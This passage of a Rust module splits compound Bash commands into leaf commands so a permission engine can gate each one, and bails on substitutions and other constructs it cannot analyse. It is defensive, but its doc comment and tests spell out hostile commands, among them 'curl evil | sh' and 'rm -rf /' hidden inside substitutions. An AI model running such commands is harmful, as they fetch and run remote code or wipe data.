//! Splits a compound Bash command into independently-evaluable leaf commands.
//!
//! The bash-rule engine matches a single regex against the entire command string. That makes
//! compound commands hard to permission safely: a trivially-safe `echo a && ls` never matches a
//! plain `^ls` allow-rule, and a broad allow-rule matched against the *head* of a compound could
//! green-light a dangerous *tail* (`ls && curl evil | sh`). This module uses a real bash parser
//! (`brush-parser`, peg-based, no `unsafe`) to break a command into its leaf simple-commands so
//! each can be evaluated on its own.
//!
//! The safety posture is conservative: any construct we cannot fully reason about (command
//! substitution, subshells, process substitution, here-docs, compound commands, or an
//! unparseable string) produces a [`SplitOutcome::Bail`] so the caller can fail safe rather than
//! guess.

// standard library
use std::collections::{BTreeMap, BTreeSet};

// 3rd party crates
use brush_parser::{
    ParserOptions,
    ast::{
        AndOr, Assignment, AssignmentName, AssignmentValue, Command, CommandPrefixOrSuffixItem,
        CompoundCommand, CompoundListItem, IoFileRedirectKind, IoFileRedirectTarget, IoRedirect,
        Pipeline, SeparatorOperator, SimpleCommand, Word,
    },
    word::{Parameter, ParameterExpr, WordPiece, WordPieceWithSource},
};
use serde::Serialize;

// local / workspace deps
use super::tool_rules::strip_cwd_prefix;
use crate::user_config::BashPathAlias;

/// Result of splitting a command into leaves.
#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) enum SplitOutcome {
    /// The command parsed into N independently-evaluable simple commands, in execution order.
    Commands(Vec<LeafCommand>),
    /// The command contains a construct we cannot fully analyze; the caller must fail safe.
    Bail(BailReason),
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub(crate) struct AliasBinding {
    pub name: String,
    pub value: String,
}

/// A single leaf simple-command extracted from a (possibly compound) command.
#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) struct LeafCommand {
    pub original: String,
    pub match_text: String,
    pub alias_expanded: Option<String>,
    pub bindings: Vec<AliasBinding>,
    /// Kept separate from rule matching so uncertainty can cap Allow without hiding Deny.
    pub requires_confirmation: Option<String>,
    /// Prevents read-only allow-rules from silently authorizing shell redirection writes.
    pub real_file_write: bool,
    declaration_id: Option<usize>,
}

/// Why [`split_command`] could not analyze a command. Carried for diagnostics; every variant maps
/// to "fail safe" at the call site.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
pub(crate) enum BailReason {
    /// `$(...)`, backticks, or `$((...))` (or a value-carrying parameter expansion that could
    /// embed one) appeared in a word.
    CommandSubstitution,
    /// A `( ... )` subshell.
    Subshell,
    /// A `<(...)` / `>(...)` process substitution.
    ProcessSubstitution,
    /// A here-document or here-string.
    HereDoc,
    /// A brace group, `if`/`for`/`while`/`case`, `[[ ]]`, `((…))`, or function definition.
    CompoundCommand,
    /// The command could not be tokenized or parsed (e.g. unbalanced quotes).
    ParseError,
}

/// Splits `command` into leaf simple-commands, normalizing in-cwd absolute paths to relative form
/// against `cwd` in the same pass.
///
/// `cwd` is the hook's working directory; words whose value begins with `cwd/` are rewritten to
/// their relative remainder so simple allow-rules can be written with relative paths (mirroring the
/// tool-rules field stripping). An empty `cwd` disables normalization.
pub(crate) fn split_command(
    command: &str,
    cwd: &str,
    configured_aliases: &BTreeSet<BashPathAlias>,
) -> SplitOutcome {
    let options = ParserOptions::default();

    let tokens = match brush_parser::tokenize_str(command) {
        Ok(tokens) => tokens,
        Err(_) => return SplitOutcome::Bail(BailReason::ParseError),
    };
    let program = match brush_parser::parse_tokens(&tokens, &options) {
        Ok(program) => program,
        Err(_) => return SplitOutcome::Bail(BailReason::ParseError),
    };

    // `SourcePosition.index` is a character offset, so collect chars once and slice/normalize by
    // char index rather than byte index (keeps multi-byte UTF-8 commands correct).
    let chars: Vec<char> = command.chars().collect();
    let mut state = AliasState::new(configured_aliases);
    let mut leaves = Vec::new();

    for complete_command in &program.complete_commands {
        for item in &complete_command.0 {
            if let Err(bail) =
                collect_list_item(item, &chars, cwd, &options, &mut state, &mut leaves)
            {
                return SplitOutcome::Bail(bail);
            }
        }
    }

    leaves.retain(|leaf| {
        leaf.declaration_id
            .is_none_or(|id| !state.used_declarations.contains(&id))
    });
    SplitOutcome::Commands(leaves)
}

#[derive(Debug, Clone)]
struct ActiveBinding {
    binding: AliasBinding,
    declaration_id: usize,
}

struct AliasState<'a> {
    configured: &'a BTreeSet<BashPathAlias>,
    active: BTreeMap<String, ActiveBinding>,
    used_declarations: BTreeSet<usize>,
    next_declaration_id: usize,
    declarations_allowed: bool,
}

impl<'a> AliasState<'a> {
    fn new(configured: &'a BTreeSet<BashPathAlias>) -> Self {
        Self {
            configured,
            active: BTreeMap::new(),
            used_declarations: BTreeSet::new(),
            next_declaration_id: 0,
            declarations_allowed: true,
        }
    }

    fn is_configured(&self, name: &str) -> bool {
        self.configured.contains(name)
    }
}

fn collect_list_item(
    item: &CompoundListItem,
    chars: &[char],
    cwd: &str,
    options: &ParserOptions,
    state: &mut AliasState,
    leaves: &mut Vec<LeafCommand>,
) -> Result<(), BailReason> {
    let and_or_list = &item.0;
    if let Some((simple, name, value)) = supported_declaration(item, chars, state) {
        let declaration_id = state.next_declaration_id;
        state.next_declaration_id += 1;

        let mut leaf = leaf_from_simple(simple, chars, cwd, options, state)?;
        leaf.declaration_id = Some(declaration_id);
        add_confirmation(
            &mut leaf.requires_confirmation,
            format!("path alias `{name}` is assigned but never consumed"),
        );
        leaves.push(leaf);
        state.active.insert(
            name.clone(),
            ActiveBinding {
                binding: AliasBinding { name, value },
                declaration_id,
            },
        );
        return Ok(());
    }

    state.declarations_allowed = false;
    collect_pipeline(&and_or_list.first, chars, cwd, options, state, leaves)?;
    for and_or in &and_or_list.additional {
        let pipeline = match and_or {
            AndOr::And(pipeline) | AndOr::Or(pipeline) => pipeline,
        };
        collect_pipeline(pipeline, chars, cwd, options, state, leaves)?;
    }
    Ok(())
}

fn supported_declaration<'a>(
    item: &'a CompoundListItem,
    chars: &[char],
    state: &AliasState,
) -> Option<(&'a SimpleCommand, String, String)> {
    if !state.declarations_allowed
        || !matches!(item.1, SeparatorOperator::Sequence)
        || !item.0.additional.is_empty()
    {
        return None;
    }

    let pipeline = &item.0.first;
    if pipeline.bang || pipeline.timed.is_some() || pipeline.seq.len() != 1 {
        return None;
    }
    let Command::Simple(simple) = &pipeline.seq[0] else {
        return None;
    };
    let assignment = sole_assignment(simple)?;
    let AssignmentName::VariableName(name) = &assignment.name else {
        return None;
    };
    if !state.is_configured(name) || state.active.contains_key(name) || assignment.append {
        return None;
    }
    let AssignmentValue::Scalar(value) = &assignment.value else {
        return None;
    };
    let source: String = chars
        .get(assignment.loc.start.index..assignment.loc.end.index)?
        .iter()
        .collect();
    if source != format!("{name}={}", value.value)
        || !is_literal_absolute_path(&value.value)
        || !has_explicit_sequence_terminator(assignment, chars)
    {
        return None;
    }

    Some((simple, name.clone(), value.value.clone()))
}

fn sole_assignment(simple: &SimpleCommand) -> Option<&Assignment> {
    if simple.word_or_name.is_some() || simple.suffix.is_some() {
        return None;
    }
    let items = &simple.prefix.as_ref()?.0;
    if items.len() != 1 {
        return None;
    }
    match &items[0] {
        CommandPrefixOrSuffixItem::AssignmentWord(assignment, _) => Some(assignment),
        _ => None,
    }
}

fn is_literal_absolute_path(value: &str) -> bool {
    value.starts_with('/')
        && value.bytes().all(|byte| {
            byte == b'/' || byte.is_ascii_alphanumeric() || b"._@+,:=%-".contains(&byte)
        })
}

fn has_explicit_sequence_terminator(assignment: &Assignment, chars: &[char]) -> bool {
    chars
        .get(assignment.loc.end.index..)
        .unwrap_or_default()
        .iter()
        .find(|ch| !matches!(ch, ' ' | '\t' | '\r'))
        .is_some_and(|ch| matches!(ch, ';' | '\n'))
}

fn collect_pipeline(
    pipeline: &Pipeline,
    chars: &[char],
    cwd: &str,
    options: &ParserOptions,
    state: &mut AliasState,
    leaves: &mut Vec<LeafCommand>,
) -> Result<(), BailReason> {
    for command in &pipeline.seq {
        match command {
            Command::Simple(simple) => {
                let mut leaf = leaf_from_simple(simple, chars, cwd, options, state)?;
                apply_mutation_barriers(simple, state, &mut leaf.requires_confirmation);
                leaves.push(leaf);
            }
            // A subshell gets its own reason so diagnostics can distinguish it; every other
            // compound construct (brace group, if/for/while/case, `[[ ]]`, `((…))`, function) is
            // out of scope for v1 and bails conservatively.
            Command::Compound(CompoundCommand::Subshell(_), _) => return Err(BailReason::Subshell),
            Command::Compound(_, _) | Command::Function(_) | Command::ExtendedTest(_, _) => {
                return Err(BailReason::CompoundCommand);
            }
        }
    }
    Ok(())
}

/// A word collected from a leaf, carrying enough information to reconstruct original,
/// alias-expanded, and cwd-normalized forms without reparsing the command.
struct LeafWord {
    original_value: String,
    expanded_value: String,
    value: String,
    span: Option<(usize, usize)>,
}

#[derive(Clone, Copy)]
enum WordRole {
    CommandName,
    Other,
}

fn leaf_from_simple(
    simple: &SimpleCommand,
    chars: &[char],
    cwd: &str,
    options: &ParserOptions,
    state: &mut AliasState,
) -> Result<LeafCommand, BailReason> {
    let mut words = Vec::new();
    let mut bindings = Vec::new();
    let mut requires_confirmation = None;
    let mut real_file_write = false;

    if let Some(prefix) = &simple.prefix {
        for item in &prefix.0 {
            process_item(
                item,
                chars,
                cwd,
                options,
                state,
                &mut words,
                &mut bindings,
                &mut requires_confirmation,
                &mut real_file_write,
                WordRole::Other,
            )?;
        }
    }
    if let Some(name) = &simple.word_or_name {
        push_word(
            name,
            WordRole::CommandName,
            chars,
            cwd,
            options,
            state,
            &mut words,
            &mut bindings,
            &mut requires_confirmation,
        )?;
    }
    if let Some(suffix) = &simple.suffix {
        for item in &suffix.0 {
            process_item(
                item,
                chars,
                cwd,
                options,
                state,
                &mut words,
                &mut bindings,
                &mut requires_confirmation,
                &mut real_file_write,
                WordRole::Other,
            )?;
        }
    }

    let original = build_leaf_text(&words, chars, LeafTextStage::Original);
    let expanded = build_leaf_text(&words, chars, LeafTextStage::Expanded);
    let match_text = build_leaf_text(&words, chars, LeafTextStage::Normalized);
    Ok(LeafCommand {
        original,
        match_text,
        alias_expanded: words.iter().any(LeafWord::was_expanded).then_some(expanded),
        bindings,
        requires_confirmation,
        real_file_write,
        declaration_id: None,
    })
}

impl LeafWord {
    fn was_expanded(&self) -> bool {
        self.expanded_value != self.original_value
    }
}

#[allow(clippy::too_many_arguments)]
fn process_item(
    item: &CommandPrefixOrSuffixItem,
    chars: &[char],
    cwd: &str,
    options: &ParserOptions,
    state: &mut AliasState,
    words: &mut Vec<LeafWord>,
    bindings: &mut Vec<AliasBinding>,
    requires_confirmation: &mut Option<String>,
    real_file_write: &mut bool,
    word_role: WordRole,
) -> Result<(), BailReason> {
    match item {
        CommandPrefixOrSuffixItem::Word(word) => push_word(
            word,
            word_role,
            chars,
            cwd,
            options,
            state,
            words,
            bindings,
            requires_confirmation,
        )
        .map(|_| ()),
        CommandPrefixOrSuffixItem::AssignmentWord(_, word) => {
            push_assignment_word(word, chars, options, state, words, requires_confirmation)
        }
        CommandPrefixOrSuffixItem::IoRedirect(redirect) => process_redirect(
            redirect,
            chars,
            cwd,
            options,
            state,
            words,
            bindings,
            requires_confirmation,
            real_file_write,
        ),
        // `<(...)` / `>(...)` runs a command in a subshell; cannot reason about it.
        CommandPrefixOrSuffixItem::ProcessSubstitution(_, _) => {
            Err(BailReason::ProcessSubstitution)
        }
    }
}

#[allow(clippy::too_many_arguments)]
fn process_redirect(
    redirect: &IoRedirect,
    chars: &[char],
    cwd: &str,
    options: &ParserOptions,
    state: &mut AliasState,
    words: &mut Vec<LeafWord>,
    bindings: &mut Vec<AliasBinding>,
    requires_confirmation: &mut Option<String>,
    real_file_write: &mut bool,
) -> Result<(), BailReason> {
    match redirect {
        IoRedirect::File(_fd, kind, target) => match target {
            IoFileRedirectTarget::Filename(word) => {
                let value = push_word(
                    word,
                    WordRole::Other,
                    chars,
                    cwd,
                    options,
                    state,
                    words,
                    bindings,
                    requires_confirmation,
                )?;
                if writes_real_file(kind) && !is_dev_null(&value) {
                    *real_file_write = true;
                }
                Ok(())
            }
            IoFileRedirectTarget::Duplicate(word) => {
                let value = push_word(
                    word,
                    WordRole::Other,
                    chars,
                    cwd,
                    options,
                    state,
                    words,
                    bindings,
                    requires_confirmation,
                )?;
                if writes_real_file(kind) && !is_dev_null(&value) && !is_fd_dup_target(&value) {
                    *real_file_write = true;
                }
                Ok(())
            }
            // A raw descriptor target (e.g. `>&2`) never names a file.
            IoFileRedirectTarget::Fd(_) => Ok(()),
            IoFileRedirectTarget::ProcessSubstitution(_, _) => Err(BailReason::ProcessSubstitution),
        },
        // `&>file` / `&>>file` redirect both stdout and stderr to a real file.
        IoRedirect::OutputAndError(word, _append) => {
            let value = push_word(
                word,
                WordRole::Other,
                chars,
                cwd,
                options,
                state,
                words,
                bindings,
                requires_confirmation,
            )?;
            if !is_dev_null(&value) {
                *real_file_write = true;
            }
            Ok(())
        }
        IoRedirect::HereDocument(_, _) | IoRedirect::HereString(_, _) => Err(BailReason::HereDoc),
    }
}

fn writes_real_file(kind: &IoFileRedirectKind) -> bool {
    // Brush uses DuplicateOutput for both `>&file` and fd duplication; the caller excludes
    // descriptor targets after this direction check.
    matches!(
        kind,
        IoFileRedirectKind::Write
            | IoFileRedirectKind::Append
            | IoFileRedirectKind::Clobber
            | IoFileRedirectKind::ReadAndWrite
            | IoFileRedirectKind::DuplicateOutput
    )
}

fn is_dev_null(value: &str) -> bool {
    value == "/dev/null"
}

fn is_fd_dup_target(value: &str) -> bool {
    if value == "-" {
        return true;
    }
    let digits = value.strip_suffix('-').unwrap_or(value);
    !digits.is_empty() && digits.chars().all(|c| c.is_ascii_digit())
}

#[allow(clippy::too_many_arguments)]
fn push_word(
    word: &Word,
    role: WordRole,
    chars: &[char],
    cwd: &str,
    options: &ParserOptions,
    state: &mut AliasState,
    words: &mut Vec<LeafWord>,
    bindings: &mut Vec<AliasBinding>,
    requires_confirmation: &mut Option<String>,
) -> Result<String, BailReason> {
    let analysis = analyze_word(&word.value, options, state, role)?;
    for binding in analysis.bindings {
        if !bindings.contains(&binding) {
            bindings.push(binding);
        }
    }
    if let Some(reason) = analysis.requires_confirmation {
        add_confirmation(requires_confirmation, reason);
    }

    let stripped = strip_cwd_prefix(&analysis.expanded, cwd);
    let normalized = stripped != analysis.expanded && !has_parent_component(stripped);
    let value = if normalized {
        stripped.to_string()
    } else {
        analysis.expanded.clone()
    };
    let span = word.loc.as_ref().and_then(|loc| {
        let (start, end) = (loc.start.index, loc.end.index);
        (start <= end && end <= chars.len()).then_some((start, end))
    });

    words.push(LeafWord {
        original_value: word.value.clone(),
        expanded_value: analysis.expanded.clone(),
        value,
        span,
    });
    Ok(analysis.expanded)
}

fn push_assignment_word(
    word: &Word,
    chars: &[char],
    options: &ParserOptions,
    state: &AliasState,
    words: &mut Vec<LeafWord>,
    requires_confirmation: &mut Option<String>,
) -> Result<(), BailReason> {
    let scan = scan_word(&word.value, options, state)?;
    if !scan.supported.is_empty() || !scan.unsupported.is_empty() {
        add_confirmation(
            requires_confirmation,
            "path aliases referenced inside assignments are not statically expanded".to_string(),
        );
    }
    let span = word.loc.as_ref().and_then(|loc| {
        let (start, end) = (loc.start.index, loc.end.index);
        (start <= end && end <= chars.len()).then_some((start, end))
    });
    words.push(LeafWord {
        original_value: word.value.clone(),
        expanded_value: word.value.clone(),
        value: word.value.clone(),
        span,
    });
    Ok(())
}

struct WordAnalysis {
    expanded: String,
    bindings: Vec<AliasBinding>,
    requires_confirmation: Option<String>,
}

struct ParameterScan {
    total_expansions: usize,
    supported: Vec<(String, usize, usize)>,
    unsupported: Vec<String>,
}

fn analyze_word(
    value: &str,
    options: &ParserOptions,
    state: &mut AliasState,
    role: WordRole,
) -> Result<WordAnalysis, BailReason> {
    let scan = scan_word(value, options, state)?;
    let mut requires_confirmation = scan.unsupported.into_iter().next();
    let mut bindings = Vec::new();
    let mut expanded = value.to_string();
    if let Some((name, start, end)) = scan.supported.into_iter().next() {
        if scan.total_expansions != 1 {
            add_confirmation(
                &mut requires_confirmation,
                format!(
                    "path alias `{name}` appears with multiple parameter expansions in one word"
                ),
            );
        } else if let Some(active) = state.active.get(&name).cloned() {
            expanded = replace_word_span(value, start, end, &active.binding.value)
                .ok_or(BailReason::ParseError)?;
            state.used_declarations.insert(active.declaration_id);
            bindings.push(active.binding);
            if matches!(role, WordRole::CommandName) {
                add_confirmation(
                    &mut requires_confirmation,
                    format!("path alias `{name}` expands in command position"),
                );
            }
        } else {
            add_confirmation(
                &mut requires_confirmation,
                format!("path alias `{name}` has no supported active binding"),
            );
        }
    }

    Ok(WordAnalysis {
        expanded,
        bindings,
        requires_confirmation,
    })
}

fn scan_word(
    value: &str,
    options: &ParserOptions,
    state: &AliasState,
) -> Result<ParameterScan, BailReason> {
    let pieces = brush_parser::word::parse(value, options).map_err(|_| BailReason::ParseError)?;
    let mut scan = ParameterScan {
        total_expansions: 0,
        supported: Vec::new(),
        unsupported: Vec::new(),
    };
    scan_pieces(&pieces, false, value, state, &mut scan)?;
    Ok(scan)
}

fn scan_pieces(
    pieces: &[WordPieceWithSource],
    quoted: bool,
    value: &str,
    state: &AliasState,
    scan: &mut ParameterScan,
) -> Result<(), BailReason> {
    for piece in pieces {
        match &piece.piece {
            WordPiece::CommandSubstitution(_)
            | WordPiece::BackquotedCommandSubstitution(_)
            | WordPiece::ArithmeticExpression(_) => return Err(BailReason::CommandSubstitution),
            WordPiece::DoubleQuotedSequence(inner)
            | WordPiece::GettextDoubleQuotedSequence(inner) => {
                scan_pieces(inner, true, value, state, scan)?;
            }
            WordPiece::ParameterExpansion(expr) => {
                scan.total_expansions += 1;
                let Some(name) = parameter_alias_name(expr) else {
                    if !is_plain_parameter(expr) {
                        return Err(BailReason::CommandSubstitution);
                    }
                    continue;
                };
                if !state.is_configured(name) {
                    if !is_plain_parameter(expr) {
                        return Err(BailReason::CommandSubstitution);
                    }
                    continue;
                }

                if quoted || !is_supported_alias_parameter(expr) {
                    if contains_hidden_execution(value) {
                        return Err(BailReason::CommandSubstitution);
                    }
                    scan.unsupported.push(format!(
                        "path alias `{name}` uses a quoted, indirect, or dynamic expansion"
                    ));
                } else {
                    scan.supported
                        .push((name.to_string(), piece.start_index, piece.end_index));
                }
            }
            _ => {}
        }
    }
    Ok(())
}

fn parameter_alias_name(expr: &ParameterExpr) -> Option<&str> {
    let parameter = match expr {
        ParameterExpr::Parameter { parameter, .. }
        | ParameterExpr::UseDefaultValues { parameter, .. }
        | ParameterExpr::AssignDefaultValues { parameter, .. }
        | ParameterExpr::IndicateErrorIfNullOrUnset { parameter, .. }
        | ParameterExpr::UseAlternativeValue { parameter, .. }
        | ParameterExpr::ParameterLength { parameter, .. }
        | ParameterExpr::RemoveSmallestSuffixPattern { parameter, .. }
        | ParameterExpr::RemoveLargestSuffixPattern { parameter, .. }
        | ParameterExpr::RemoveSmallestPrefixPattern { parameter, .. }
        | ParameterExpr::RemoveLargestPrefixPattern { parameter, .. }
        | ParameterExpr::Substring { parameter, .. }
        | ParameterExpr::Transform { parameter, .. }
        | ParameterExpr::UppercaseFirstChar { parameter, .. }
        | ParameterExpr::UppercasePattern { parameter, .. }
        | ParameterExpr::LowercaseFirstChar { parameter, .. }
        | ParameterExpr::LowercasePattern { parameter, .. }
        | ParameterExpr::ReplaceSubstring { parameter, .. } => parameter,
        ParameterExpr::VariableNames { prefix, .. } => return Some(prefix),
        ParameterExpr::MemberKeys { variable_name, .. } => return Some(variable_name),
    };
    match parameter {
        Parameter::Named(name) => Some(name),
        Parameter::NamedWithIndex { name, .. } | Parameter::NamedWithAllIndices { name, .. } => {
            Some(name)
        }
        Parameter::Positional(_) | Parameter::Special(_) => None,
    }
}

fn is_supported_alias_parameter(expr: &ParameterExpr) -> bool {
    matches!(
        expr,
        ParameterExpr::Parameter {
            parameter: Parameter::Named(_),
            indirect: false,
        }
    )
}

fn is_plain_parameter(expr: &ParameterExpr) -> bool {
    matches!(
        expr,
        ParameterExpr::Parameter { .. } | ParameterExpr::ParameterLength { .. }
    )
}

fn contains_hidden_execution(value: &str) -> bool {
    value.contains("$(") || value.contains('`') || value.contains("<(") || value.contains(">(")
}

fn replace_word_span(value: &str, start: usize, end: usize, replacement: &str) -> Option<String> {
    if start > end || !value.is_char_boundary(start) || !value.is_char_boundary(end) {
        return None;
    }
    Some(format!(
        "{}{}{}",
        &value[..start],
        replacement,
        &value[end..]
    ))
}

fn apply_mutation_barriers(
    simple: &SimpleCommand,
    state: &mut AliasState,
    requires_confirmation: &mut Option<String>,
) {
    if has_assignment(simple) && !state.configured.is_empty() {
        add_confirmation(
            requires_confirmation,
            "assignments outside the supported path-alias declaration invalidate all active aliases"
                .to_string(),
        );
        state.active.clear();
    }

    let Some(command) = simple.word_or_name.as_ref() else {
        return;
    };
    let Some(command) = literal_command_name(&command.value) else {
        if !state.active.is_empty() {
            add_confirmation(
                requires_confirmation,
                "a dynamic command name invalidates all active path aliases".to_string(),
            );
            state.active.clear();
        }
        return;
    };
    if is_alias_mutation_barrier(command) && !state.active.is_empty() {
        add_confirmation(
            requires_confirmation,
            format!("`{command}` may mutate shell state; all active path aliases were invalidated"),
        );
        state.active.clear();
    }
}

fn has_assignment(simple: &SimpleCommand) -> bool {
    simple
        .prefix
        .iter()
        .flat_map(|prefix| &prefix.0)
        .chain(simple.suffix.iter().flat_map(|suffix| &suffix.0))
        .any(|item| matches!(item, CommandPrefixOrSuffixItem::AssignmentWord(_, _)))
}

fn literal_command_name(value: &str) -> Option<&str> {
    (!value.is_empty()
        && value.bytes().all(|byte| {
            byte.is_ascii_alphanumeric() || matches!(byte, b'_' | b'-' | b'+' | b'.' | b'/')
        }))
    .then_some(value)
}

fn is_alias_mutation_barrier(command: &str) -> bool {
    matches!(
        command,
        "command"
            | "builtin"
            | "exec"
            | "eval"
            | "source"
            | "."
            | "trap"
            | "let"
            | "unset"
            | "export"
            | "readonly"
            | "declare"
            | "typeset"
            | "local"
            | "read"
            | "mapfile"
            | "readarray"
            | "getopts"
            | "printf"
    )
}

fn add_confirmation(slot: &mut Option<String>, reason: String) {
    match slot {
        Some(existing) if !existing.contains(&reason) => {
            existing.push_str("; ");
            existing.push_str(&reason);
        }
        None => *slot = Some(reason),
        _ => {}
    }
}

fn has_parent_component(path: &str) -> bool {
    path.split('/').any(|component| component == "..")
}

#[derive(Clone, Copy)]
enum LeafTextStage {
    Original,
    Expanded,
    Normalized,
}

fn build_leaf_text(words: &[LeafWord], chars: &[char], stage: LeafTextStage) -> String {
    if words.is_empty() {
        return String::new();
    }

    if words.iter().any(|word| word.span.is_none()) {
        return words
            .iter()
            .map(|word| leaf_word_value(word, stage))
            .collect::<Vec<_>>()
            .join(" ");
    }

    let mut ordered: Vec<&LeafWord> = words.iter().collect();
    ordered.sort_by_key(|word| word.span.expect("span checked present above").0);

    let leaf_start = ordered[0].span.expect("span checked present above").0;
    let mut out = String::new();
    let mut pos = leaf_start;
    for word in ordered {
        let (start, end) = word.span.expect("span checked present above");
        if start > pos {
            out.extend(&chars[pos..start]);
        }
        let replacement = leaf_word_value(word, stage);
        let preserve_source = match stage {
            LeafTextStage::Original => true,
            LeafTextStage::Expanded => !word.was_expanded(),
            LeafTextStage::Normalized => !word.was_expanded() && word.value == word.expanded_value,
        };
        if preserve_source {
            out.extend(&chars[start..end]);
        } else {
            out.push_str(replacement);
        }
        pos = end.max(pos);
    }
    out
}

fn leaf_word_value(word: &LeafWord, stage: LeafTextStage) -> &str {
    match stage {
        LeafTextStage::Original => &word.original_value,
        LeafTextStage::Expanded => &word.expanded_value,
        LeafTextStage::Normalized => &word.value,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    /// North-star command from the plan: every leaf is a trivially-safe read-only command.
    const NORTH_STAR: &str = r#"echo "===== Is there a lib.rs? =====" && ls crates/moriarty/src/lib.rs 2>/dev/null && echo "FOUND lib.rs" || echo "NO lib.rs (binary only via main.rs)"; echo; echo "===== Cargo.toml deps =====" && cat crates/moriarty/Cargo.toml; echo; cat Cargo.toml 2>/dev/null | head -60"#;

    fn aliases(names: &[&str]) -> BTreeSet<BashPathAlias> {
        names
            .iter()
            .map(|name| BashPathAlias::validate((*name).to_string()).unwrap())
            .collect()
    }

    fn leaves(command: &str, cwd: &str) -> Vec<LeafCommand> {
        leaves_with_aliases(command, cwd, &[])
    }

    fn leaves_with_aliases(command: &str, cwd: &str, names: &[&str]) -> Vec<LeafCommand> {
        match split_command(command, cwd, &aliases(names)) {
            SplitOutcome::Commands(leaves) => leaves,
            SplitOutcome::Bail(reason) => {
                panic!("expected Commands for {command:?}, got Bail({reason:?})")
            }
        }
    }

    fn p_leaves(command: &str) -> Vec<LeafCommand> {
        leaves_with_aliases(command, "/work", &["P"])
    }

    fn confirmation_leaves(command: &str) -> Vec<LeafCommand> {
        let leaves = p_leaves(command);
        assert!(
            leaves
                .iter()
                .any(|leaf| leaf.requires_confirmation.is_some()),
            "case {command:?}: {leaves:?}"
        );
        leaves
    }

    fn texts(command: &str, cwd: &str) -> Vec<String> {
        leaves(command, cwd)
            .into_iter()
            .map(|leaf| leaf.match_text)
            .collect()
    }

    fn bail(command: &str) -> BailReason {
        bail_with_aliases(command, &[])
    }

    fn bail_with_aliases(command: &str, names: &[&str]) -> BailReason {
        match split_command(command, "", &aliases(names)) {
            SplitOutcome::Bail(reason) => reason,
            SplitOutcome::Commands(leaves) => {
                panic!("expected Bail for {command:?}, got {leaves:?}")
            }
        }
    }

    #[test]
    fn north_star_splits_into_expected_leaves() {
        assert_eq!(
            texts(NORTH_STAR, ""),
            vec![
                r#"echo "===== Is there a lib.rs? =====""#,
                "ls crates/moriarty/src/lib.rs 2>/dev/null",
                r#"echo "FOUND lib.rs""#,
                r#"echo "NO lib.rs (binary only via main.rs)""#,
                "echo",
                r#"echo "===== Cargo.toml deps =====""#,
                "cat crates/moriarty/Cargo.toml",
                "echo",
                "cat Cargo.toml 2>/dev/null",
                "head -60",
            ]
        );
    }

    #[test]
    fn north_star_has_no_real_file_writes() {
        assert!(
            leaves(NORTH_STAR, "")
                .iter()
                .all(|leaf| !leaf.real_file_write)
        );
    }

    #[test]
    fn quotes_and_escapes_keep_separators_inside_one_leaf() {
        for command in [r#"echo "a; b""#, r#"echo 'a && b'"#, r"echo a\;b"] {
            assert_eq!(leaves(command, "").len(), 1, "command {command:?}");
        }
        assert_eq!(texts(r#"echo "a; b""#, ""), vec![r#"echo "a; b""#]);
        assert_eq!(texts(r"echo a\;b", ""), vec![r"echo a\;b"]);
    }

    #[test]
    fn quoted_parens_do_not_trigger_subshell_bail() {
        assert_eq!(texts(r#"echo "(x)""#, ""), vec![r#"echo "(x)""#]);
    }

    #[test]
    fn pipeline_splits_each_stage() {
        assert_eq!(texts("a|b|c", ""), vec!["a", "b", "c"]);
    }

    #[test]
    fn newlines_split_into_separate_leaves() {
        assert_eq!(texts("echo a\necho b", ""), vec!["echo a", "echo b"]);
    }

    #[test]
    fn bails_on_unanalyzable_constructs() {
        assert_eq!(bail("cat $(whoami)"), BailReason::CommandSubstitution);
        assert_eq!(bail("echo `date`"), BailReason::CommandSubstitution);
        assert_eq!(bail("echo $((1 + 1))"), BailReason::CommandSubstitution);
        assert_eq!(bail("(ls)"), BailReason::Subshell);
        assert_eq!(bail("cat <(ls)"), BailReason::ProcessSubstitution);
        assert_eq!(bail("cat <<EOF\nhi\nEOF"), BailReason::HereDoc);
        assert_eq!(bail("cat <<<word"), BailReason::HereDoc);
        assert_eq!(bail("[[ -f x ]]"), BailReason::CompoundCommand);
        assert_eq!(bail("((1))"), BailReason::CompoundCommand);
        assert_eq!(bail("if true; then ls; fi"), BailReason::CompoundCommand);
        assert_eq!(bail(r#"echo "unbalanced"#), BailReason::ParseError);
    }

    #[test]
    fn bails_on_command_substitution_hidden_in_parameter_default() {
        // The dangerous substitution lives inside the parameter expansion's default value, which
        // the word grammar keeps as an unparsed string; configured aliases must retain the same
        // execution-construct bail even though harmless dynamic alias forms only prompt.
        assert_eq!(
            bail(r#"echo "${UNSET:-$(rm -rf /)}""#),
            BailReason::CommandSubstitution
        );
        for command in [
            "P=/work/project; echo ${P:-$(rm -rf /)}",
            "P=/work/project; echo ${P:-<(rm -rf /)}",
            "P=/work/project; echo ${P:-$((1 + 1))}",
            "P=/work/project; X=$(rm -rf /)",
            "P=/work/project; X=`rm -rf /`",
            "P=/work/project; X=$((1 + 1))",
        ] {
            assert_eq!(
                bail_with_aliases(command, &["P"]),
                BailReason::CommandSubstitution,
                "case {command:?}"
            );
        }
        // Brush rejects process substitution in this assignment spelling before leaf collection;
        // ParseError has the same whole-command fail-safe semantics.
        assert_eq!(
            bail_with_aliases("P=/work/project; X=<(rm -rf /)", &["P"]),
            BailReason::ParseError
        );
    }

    #[test]
    fn plain_parameter_expansions_are_allowed() {
        assert_eq!(texts("echo $HOME", ""), vec!["echo $HOME"]);
        assert_eq!(texts("echo ${PATH}", ""), vec!["echo ${PATH}"]);
        assert_eq!(texts("echo ${#HOME}", ""), vec!["echo ${#HOME}"]);
    }

    #[test]
    fn newline_declarations_and_literal_path_punctuation_are_supported() {
        for (command, cwd, expected) in [
            (
                "P=/work/project\nrg needle $P/file",
                "/work",
                "rg needle project/file",
            ),
            (
                "P=/work/a_b-c.d,@+x:y=z%20; echo $P/file",
                "",
                "echo /work/a_b-c.d,@+x:y=z%20/file",
            ),
            (
                "P=/work/project; echo --file=$P/input pre世界$P/file $PP '$P'",
                "/work/project",
                "echo --file=/work/project/input pre世界/work/project/file $PP '$P'",
            ),
        ] {
            assert_eq!(
                leaves_with_aliases(command, cwd, &["P"])[0].match_text,
                expected
            );
        }
    }

    #[test]
    fn unsupported_alias_declarations_force_confirmation_without_hiding_later_leaves() {
        let groups = [
            (
                "value",
